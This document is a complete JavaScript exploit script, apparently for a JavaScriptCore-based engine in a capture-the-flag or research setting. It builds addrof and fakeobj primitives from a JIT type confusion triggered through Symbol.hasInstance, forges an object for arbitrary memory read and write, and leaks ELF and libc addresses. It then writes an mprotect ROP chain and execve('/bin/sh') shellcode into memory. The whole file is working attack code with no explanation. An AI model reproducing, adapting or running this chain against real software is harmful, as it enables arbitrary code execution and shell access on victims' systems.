let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new Uint32Array(conversion_buffer);
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0]+int_view[1]*0x100000000;
}
Number.prototype.i2f = function() {
    var right = this&0xffffffff;
    if(right < 0)
        right += 0x100000000;
    var left = (this-right)/0x100000000;
    int_view[0] = right;
    int_view[1] = left;
    return float_view[0];
}

Number.prototype.value = function(){
    return (this-0x1000000000000).i2f();
}
Number.prototype.hex = function() {
    return '0x'+this.toString(16);
}
const varToString = varObj => Object.keys(varObj)[0]
function show_addr(o){
    print( "Address:"+ addressOf(o).f2i().hex());
}
function gc(){
    for(var i=0;i<0x100;i++){
        new ArrayBuffer(0x10000);
    }
}
function getRandomInt(max) {
      return Math.floor(Math.random() * Math.floor(max));
}
function randstr(n){
    var table = "abcdefghijklmnopqrstuvwxyz";
    var t = "";
    for(var i=0;i<n;i++){
        t+=table[getRandomInt(table.length)];
    }
    return t;
}



function addrof(obj){
    var rand = randstr(5);
    eval(`
        class ${rand}{
            static [Symbol.hasInstance](instance){
                doBad();
                return true;
            }
        };
        function handler(f){
            var result = f[0];
            [1.1,2.1] instanceof ${rand};
            return f[1]+0.0;
        };
        var doBad = function(){};
        for(var i=0;i<10000;i++){
            var f = [1.1,1.2];
            handler(f);
        }
        var f = [1.1,1.2];
        doBad = function(){
           f[1] = obj;
        }
        var ret = handler(f);
    `);
    return ret.f2i();
}
function fakeobj(value){
    var rand = randstr(5);
    eval(`
        class ${rand}{
            static [Symbol.hasInstance](instance){
                doBad();
                return true;
            }
        };
        function handler(f){
            var result = f[0];
            [1.1,2.1] instanceof ${rand};
            f[1] = ${value.i2f()};
        };
        var doBad = function(){};
        for(var i=0;i<10000;i++){
            var f = [];
            for(var c=0;c<0x10;c++){
                f.push(0.1);
            }
            handler(f);
        }
        var f = [];
        for(var c=0;c<0x10;c++){
            f.push(0.1);
        }
        doBad = function(){
           f[0] = Array;
        }
        handler(f);
        var ret = f[1];
    `);
    return ret;
}
var addr = addrof({p: 0x1337});
var structs = []
for (var i = 0; i < 0x1000;++i){
    var array = [13.37,1.234];
    array.pointer = 1234;
    array['prop' + i] = 13.37;
    structs.push(array);
}

var victim = structs[0x800];
var flags_double_array = 0x0108200700000942.value();

var container = {
    header: flags_double_array,
    butterfly: victim
};

// create object having |victim| as butterfly.
var containerAddr = addrof(container);

// add the offset to let compiler recognize fake structure
var hax = fakeobj(containerAddr+0x10);

//show_addr(hax);
//show_addr(victim);

var origButterfly = hax[1];

var memory = {
    addrof: addrof,
    fakeobj: fakeobj,

    // Write an int64 to the given address.
    write64(addr, int64) {
        data = [];
        for(var i=0;i<8;i++){
            data.push(int64&0xff);
            int64/=0x100;
        }
        this.write(addr,data);
    },

    // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
    write(addr, data) {
        while (data.length % 4 != 0)
            data.push(0);
		var bytes = new Uint8Array(data);
		var ints = new Uint16Array(bytes.buffer);

		for (var i = 0; i < ints.length; i++){
            hax[1] = (addr+2*i+0x10).i2f();
            victim.pointer = ints[i];
        }
	},

	// Read a 64 bit value. Only works for bit patterns that don't represent NaN.
	read64(addr) {
		// Set butterfly of victim object and dereference.
		//hax[1] = Add(addr, 0x10).asDouble();
        hax[1] = (addr+0x10).i2f();
		return this.addrof(victim.pointer);
	},
};
o = {a:1,b:2};
function triger(o){
    return o.a+o.b;
}
for(var i=0;i<10000;i++){
    triger(o);
}
var triger_addr = addrof(Math.sin);
print(triger_addr.hex());
var p1 = memory.read64(triger_addr+0x10);
var p2 = memory.read64(p1+0x40);
print(p2.hex());

elf_base = p2 - 0x32be0;
var libc_base = memory.read64(elf_base+0x33808) - 0x21ab0;
print(libc_base.hex());
var p4 = memory.read64(libc_base + 0x3ee098);
print(p4.hex());
start = p4 - 0x118;
rop = [
    libc_base+0x2155f,
    Math.floor(p4/0x1000)*0x1000,
    libc_base + 0x01b96,// pop rdx
    7,
    libc_base+0x23e6a,//pop rsi
    0x1000,
    libc_base+0x11bae0,//mprotect
    p4
]
for(var i=0;i<rop.length;i++){
    memory.write64(start+i*8,rop[i]);
}
shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];
memory.write(p4,shellcode);









